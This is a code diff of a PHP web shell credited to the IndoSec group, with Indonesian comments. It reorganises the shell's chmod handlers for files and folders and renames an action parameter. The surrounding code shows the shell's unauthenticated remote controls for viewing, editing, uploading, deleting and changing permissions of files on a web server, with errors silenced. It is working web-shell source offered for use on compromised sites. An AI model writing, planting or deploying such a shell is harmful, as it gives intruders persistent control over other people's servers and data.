@@ -12,7 +12,7 @@
 	* Untuk Tools Yang Lain Akan Ditambahkan Di-update Berikutnya..
 	* ©2019 { IndoSec } -Holiq-
 	* Contact Me? fb.com/holiq.xidWhatsApp? Cek Bio Fb
-	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/responsive harap dimaklumi :v
+	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/responsive harap dimaklumi. V 0.1
 */
 session_start();
 error_reporting(0);
@@ -527,50 +527,11 @@ function r($dir,$perm) {
 					<p class="card-text">{ IndoSec } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
 				</div>
 				<div class="card-footer">
-					<p class="card-text"><small class="text-muted">Copyright 2019 { IndoSec }</small></p>
+					<small class="card-text text-muted">Copyright 2019 { IndoSec }</small>
 				</div>
 			</div><br/>';
 			exit;
 		}
-		
-		//chmod
-		if($_GET['aksi'] == 'chmod') {
-			$nfile = basename($file);
-			echo "<form method='POST'>
-				<h5>Chmod File : $nfile </h5>
-				<div class='form-group input-group'>
-					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
-					<input type='submit' class='btn btn-danger form-control' value='Chmod'>
-				</div>
-			</form>";
-			
-			if(isset($_POST['perm'])){
-				if(@chmod($_GET['file'],$_POST['perm'])){
-					echo '<font color="lime">Change Permission Berhasil</font><br/>';
-				}else{
-					echo '<font color="white">Change Permission Gagal</font><br/>';
-				}
-			}
-		}
-		
-		if($_GET['aksi'] == 'chmod_dir') {
-			$ndir = basename($dir);
-			echo "<form method='POST'>
-				<h5>Chmod Folder : $ndir </h5>
-				<div class='form-group input-group'>
-					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
-					<input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
-				</div>
-			</form>";
-			if(isset($_POST['chmo'])){
-				if(@chmod($_GET['dir'],$_POST['perm'])){
-					echo '<font color="lime">Change Permission Berhasil</font><br/>';
-				}else{
-					echo '<font color="white">Change Permission Gagal</font><br/>';
-				}
-			}
-		}
-		
 		
 		//upload
 		if ($_GET['aksi'] == 'upload') {
@@ -617,6 +578,26 @@ function r($dir,$perm) {
 		if (isset($_GET['file'])) {
 			$file = $_GET['file'];
 		}
+		$nfile = basename($file);
+		//chmod
+		if($_GET['aksi'] == 'chmod_file') {
+			echo "<form method='POST'>
+				<h5>Chmod File : $nfile </h5>
+				<div class='form-group input-group'>
+					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
+					<input type='submit' class='btn btn-danger form-control' value='Chmod'>
+				</div>
+			</form>";
+			
+			if(isset($_POST['perm'])){
+				if(@chmod($_GET['file'],$_POST['perm'])){
+					echo '<font color="lime">Change Permission Berhasil</font><br/>';
+				}else{
+					echo '<font color="white">Change Permission Gagal</font><br/>';
+				}
+			}
+		}
+		
 		//buat_file
 		if ($_GET['aksi'] == 'buat_file') {
 			echo "<h4><img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Buat File :</h4>
@@ -654,7 +635,6 @@ function r($dir,$perm) {
 				}
 			}
 		}
-		$nfile = basename($file);
 		/*
 			View
 		*/
@@ -663,7 +643,6 @@ function r($dir,$perm) {
 			<h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>
 			<textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
 		}
-		
 		/*
 			Edit
 		*/
@@ -690,7 +669,6 @@ function r($dir,$perm) {
 				}
 			}
 		}
-		
 		/*
 			Rename
 		*/
@@ -723,7 +701,6 @@ function r($dir,$perm) {
 				}
 			}
 		}
-		
 		/*
 			Delete File
 		*/
@@ -751,6 +728,24 @@ function r($dir,$perm) {
 			}
 		}
 		$ndir = basename($dir);
+		//chmod
+		if($_GET['aksi'] == 'chmod_dir') {
+			$ndir = basename($dir);
+			echo "<form method='POST'>
+				<h5>Chmod Folder : $ndir </h5>
+				<div class='form-group input-group'>
+					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
+					<input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
+				</div>
+			</form>";
+			if(isset($_POST['chmo'])){
+				if(@chmod($_GET['dir'],$_POST['perm'])){
+					echo '<font color="lime">Change Permission Berhasil</font><br/>';
+				}else{
+					echo '<font color="white">Change Permission Gagal</font><br/>';
+				}
+			}
+		}
 		/*
 			Add Folder
 		*/
@@ -2540,7 +2535,7 @@ function r($dir,$perm) {
 					echo' <a href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">'.$_file.'</a></td>
 					<td>'.$size.'</td>
 					<td>'.$ftime.'</td>
-					<td><a href="?dir='.$path.'&aksi=chmod&file='.$path.'/'.$file.'" class="text-center">';
+					<td><a href="?dir='.$path.'&aksi=chmod_file&file='.$path.'/'.$file.'" class="text-center">';
 					if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
 					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 					echo perms($path.'/'.$file);
